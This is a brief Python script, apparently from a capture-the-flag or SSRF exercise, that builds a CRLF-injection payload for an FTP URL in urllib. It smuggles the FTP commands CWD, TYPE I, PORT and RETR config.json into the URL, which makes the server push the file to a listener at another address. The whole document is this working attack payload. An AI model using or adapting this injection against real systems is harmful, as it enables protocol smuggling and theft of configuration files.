import urllib.request

# Download file
a = '''CWD files
TYPE I
PORT 192,168,1,25,0,1890
RETR config.json
'''

c = 'ftp://fan:root@172.20.0.2:8877/files%0d%0a'

exp = urllib.parse.quote(a.replace('\n', '\r\n'))
exp = c + exp
print(exp)